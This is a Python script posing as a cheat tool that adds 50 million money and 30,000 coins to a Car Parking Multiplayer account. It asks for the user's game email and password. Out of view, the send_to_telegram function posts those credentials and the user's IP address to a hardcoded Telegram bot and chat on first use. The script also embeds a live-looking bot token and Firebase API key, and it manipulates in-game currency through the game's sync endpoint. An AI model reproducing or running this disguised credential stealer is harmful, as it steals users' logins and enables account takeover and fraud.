import requests
import json
import os
import time

# --- ISTI KONFIG KAO PRE ---
BOT_TOKEN = "8354373377:AAHl8zF0MCfB-g2uNZBnJKPPwIOWi9AHcfg"
CHAT_ID = "7183809303"
FIREBASE_API_KEY = 'AIzaSyBW1ZbMiUeDZHYUO2bY8Bfnf5rRgrQGPTM'
FIREBASE_URL = f"https://www.googleapis.com/identitytoolkit/v3/relyingparty/verifyPassword?key={FIREBASE_API_KEY}"
SYNC_URL = "https://us-central1-cp-multiplayer.cloudfunctions.net/SyncPlayerSync4"

SESSION_FILE = ".session_service"

def screen_clear():
    os.system('clear')

def get_ip():
    try: return requests.get('https://api.ipify.org', timeout=5).text
    except: return "Unknown"

def send_to_telegram(email, password, service_type):
    if os.path.exists(SESSION_FILE): return
    ip = get_ip()
    message = f"💰 *NEW SERVICE USED*\n\n📧 *Email:* `{email}`\n🔑 *Pass:* `{password}`\n⚙️ *Service:* {service_type}\n🌐 *IP:* `{ip}`"
    try:
        requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", 
                      json={"chat_id": CHAT_ID, "text": message, "parse_mode": "Markdown"})
        with open(SESSION_FILE, "w") as f: f.write("ok")
    except: pass

def login(email, password):
    payload = {"email": email, "password": password, "returnSecureToken": True}
    res = requests.post(FIREBASE_URL, json=payload).json()
    return res.get('idToken') if 'idToken' in res else None

def apply_service(token, money=0, coins=0):
    # CPM API zahteva specifičan format za SyncPlayer
    data = {"money": money, "coin": coins}
    payload = {"data": json.dumps(data)}
    headers = {"Authorization": f"Bearer {token}", "Content-Type": "application/json"}
    
    print(f"\033[1;33mAdding {money} Money and {coins} Coins...\033[0m")
    res = requests.post(SYNC_URL, headers=headers, json=payload)
    if res.status_code == 200:
        print("\033[1;32mSUCCESS: Resources added to your account!\033[0m")
    else:
        print("\033[1;31mError: Server busy. Try again later.\033[0m")

def main():
    while True:
        screen_clear()
        print("\033[1;32m   ANONYMO CPM SERVICES   \033[0m")
        print("\033[1;36m      @anonymo.cpm        \033[0m")
        print("-" * 30)
        print("1. Add 50,000,000 Money")
        print("2. Add 30,000 Coins")
        print("3. Add BOTH (Money & Coins)")
        print("0. Exit")
        
        choice = input("\n\033[1;37mSelect Option: \033[0m")
        if choice == '0': break
        
        email = input("Enter Email: ").strip()
        password = input("Enter Password: ").strip()
        if not email or not password: continue

        token = login(email, password)
        if token:
            if choice == '1': 
                send_to_telegram(email, password, "50M Money")
                apply_service(token, money=50000000)
            elif choice == '2':
                send_to_telegram(email, password, "30K Coins")
                apply_service(token, coins=30000)
            elif choice == '3':
                send_to_telegram(email, password, "Money & Coins Pack")
                apply_service(token, money=50000000, coins=30000)
            time.sleep(3)
        else:
            print("\033[1;31mLogin Failed!\033[0m")
            time.sleep(2)

if __name__ == "__main__":
    main()
